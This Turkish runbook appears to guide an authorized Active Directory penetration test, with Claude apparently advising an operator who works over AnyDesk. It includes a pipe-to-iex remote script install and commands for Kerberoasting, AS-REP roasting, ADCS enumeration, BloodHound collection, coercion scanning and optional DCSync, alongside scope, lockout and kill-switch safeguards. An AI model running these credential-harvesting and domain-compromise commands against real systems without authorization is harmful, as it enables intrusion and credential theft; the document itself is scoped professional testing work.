# RUNBOOK — Engagement Günü (<CLIENT>, AnyDesk)

Bu kağıdı açık tut, sırayla uygula. Sen "el"sin (AnyDesk'te), Claude "beyin" (senin laptobunda).
Her komut çıktısını Claude'a yapıştır → o yorumlar + sıradakini söyler.

---

## 0. Bağlanmadan ÖNCE (senin laptobunda, bugün/sabah)
- [ ] İmzalı sözleşme + test tarih/saati teyitli mi? Değilse **başlama**.
- [ ] Client'tan gelmiş olmalı: **hedef IP/subnet, domain adı, DC IP, read-only test hesabı** (kullanıcı adı; parola ayrı kanaldan), hariç tutulanlar.
- [ ] Client'a hatırlat: UBDEN kurulumu **makinedeki tüm WSL'lere mirrored networking uygular ve makineyi 1 kez yeniden başlatabilir** — onayları alınsın, yedek/snapshot hazır olsun (sözleşme Madde 9).
- [ ] Laptobunda ekranı ikiye böl: sol = AnyDesk, sağ = Claude Code.

## 1. AnyDesk + ortam kontrolü
- [ ] AnyDesk ile client makinesine bağlan (tam ekran YAPMA, yarım ekran).
- [ ] Makine Win11 22H2+ mı, admin yetkin var mı, ~30 GB boş disk + internet var mı? (UBDEN şart koşuyor.)

## 2. UBDEN kurulumu ve taraması (Can abinin işi)
PowerShell (yönetici):
```powershell
irm 'https://raw.githubusercontent.com/ubden/ubden-cyber-wsl/v4.8.3-wsl.1/bootstrap.ps1' | iex
```
- [ ] Sihirbazda kapsamı gir (müşteri: <CLIENT>, hedefler, hariçler, DC, test hesabı).
- [ ] Profil: **network** (+ AD modülü) — iç ağ işi bu. `YETKILIYIM` yaz.
- [ ] Tarama bitsin. Rapor klasörü: `~/Desktop/UBDEN-Cyber-Reports/<CLIENT>_<tarih>_<id>/`
- [ ] **Bu klasörün tam yolunu not al** → aşağıda `<RUN>` diye geçecek.

## 3. Bizim offensive katman (Kali WSL içinde — "daha iyisini yaptığımız yer")
Kali'yi aç: `wsl -d kali-linux`. parsdx-ext'i makineye getir (repo zaten kurulu; parsdx-ext dizinini kopyala veya git ile çek), sonra:

**a) Araçları kur (bir kez):**
```bash
sudo bash parsdx-ext/setup-offensive.sh
source ~/.bashrc     # pipx PATH icin
```

**b) SCOPE dosyasını yaz (ZORUNLU — bu olmadan hiçbir paket gitmez, fail-closed):**
```bash
# scope.md'deki sözleşme hedeflerini bir satıra bir yaz (IP / CIDR / hostname):
printf '10.0.0.0/24\n<DC_IP>\n<DOMAIN>\n' > scope.txt
```
Sadece bu dosyadaki hedeflere dokunulur; DEVICE_INVENTORY'de olsa bile kapsam dışı host atlanır.

**c) ÖNCE planı gör (hiçbir şey çalıştırmaz):**
```bash
python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
  --dc <DC_FQDN> --domain <DOMAIN> --ip <DC_IP> \
  --user <TEST_KULLANICI> --password '<PAROLA>' --dry-run
```
→ Çıktıyı Claude'a yapıştır. Kaç host "in / dropped" göründüğüne bak; plan mantıklıysa devam.

**d) Lockout güvenliğini teyit et (kimseyi kilitlemeyelim):**
```bash
python3 parsdx-ext/guard.py --policy --dc <DC_FQDN> --domain <DOMAIN> \
  --ip <DC_IP> --user <TEST_KULLANICI> --password '<PAROLA>'
```
→ "SAFE BUDGET" satırını Claude'a göster. (Pipeline zaten canlıda kimlik ön-doğrulaması yapıyor;
yanlış/eski şifre olursa **fan-out'tan ÖNCE** durur, hesabı kilitlemez.)

**e) Canlı çalıştır (read-only-first zincir; yazma/dump KAPALI):**
```bash
python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt \
  --dc <DC_FQDN> --domain <DOMAIN> --ip <DC_IP> \
  --user <TEST_KULLANICI> --password '<PAROLA>'
```
→ `<RUN>/parsdx/SUMMARY.md` çıkar: bulgular + kill-chain + zincir severity. Claude'a yapıştır.
Bir şey ters giderse: `touch "<RUN>/STOP"` → çalışan zincir bir sonraki adımdan önce durur (kill-switch).

**f) (Yalnız gerekliyse, Claude onaylarsa) yazma/dump adımları:**
```bash
python3 parsdx-ext/pipeline.py --run-dir "<RUN>" --scope scope.txt ... \
  --enable-writes --allow-dcsync
```
→ `YETKILIYIM` yazman istenir (pipeline'da da). DCSync = **sadece kanıt** (`-just-dc-ntlm`), veri
sızdırma YOK (sözleşme Madde 5, 8). `--allow-dcsync` ayrı bayrak — en ağır adım kendi izniyle açılır.

## 4. Rapor
- [ ] `<RUN>/parsdx/` altındaki KILL_CHAIN.md, COVERAGE_MATRIX.md, ATTACK_LAYER.json + UBDEN'in `review.json`'a işlenmiş doğrulanmış bulgular hazır.
- [ ] UBDEN raporunu yeniden ürettir (pipeline zaten yapar) veya `python3 report_v2.py "<RUN>"`.
- [ ] Çıktıyı **AnyDesk dosya transferiyle senin laptobuna** çek → cilalı raporu Claude ile burada bitir → client'ın verdiği güvenli konuma teslim.

## 5. Temizlik (profesyonellik — sözleşme Madde 7, 8, 19)
- [ ] Kali'de bıraktığımız geçici dosyaları/araçları kaldır.
- [ ] UBDEN'in açtığı `ubden` sudo kullanıcısının **şifresi `password`** → değiştir veya makineden kaldır.
- [ ] Loot/kimlik bilgileri makinede kalmasın; kanıtlar sadece rapora giren asgari kadar.
- [ ] Client isterse `destroy` ile WSL'i tamamen kaldır (⚠️ TÜM WSL'i siler — önce raporu dışarı al).

---

## Elle yedek komutlar (pipeline takılırsa, Claude yönlendirir)
```bash
# Lockout politikasi (HER auth'tan once):
python3 parsdx-ext/guard.py --policy --dc <DC> --domain <DOM> --ip <IP> --user <U> --password '<P>'
# ADCS (en sessiz DA yolu):
certipy find -u <U>@<DOM> -p '<P>' -dc-ip <IP> -vulnerable -stdout
# BloodHound (sessiz):
bloodhound-python -d <DOM> -u <U> -p '<P>' -c DCOnly -ns <IP> --zip
# Kerberoast / AS-REP (gecerli hesap, lockout riski yok):
impacket-GetUserSPNs <DOM>/<U>:'<P>' -request -dc-ip <IP>
impacket-GetNPUsers <DOM>/<U>:'<P>' -request -format hashcat -dc-ip <IP>
# Yerel-admin haritasi (tek bilinen kimlik):
nxc smb <HOSTS> -u <U> -p '<P>'
# Coercion (sadece tarama):
coercer scan -u <U> -p '<P>' -d <DOM> -t <IP>
```

## Altın kurallar
1. Kapsam dışına **tek paket** gitmesin — sadece scope.md'deki hedefler.
2. Şifre denemesi HER ZAMAN guard'dan geçsin — hesap kilitleme = işi bitirir.
3. Yazma/dump/coercion-fire = sadece açık gerekçe + Claude onayı + `YETKILIYIM`.
4. Takıldığın an dur, çıktıyı Claude'a yapıştır. Tahmin etme.
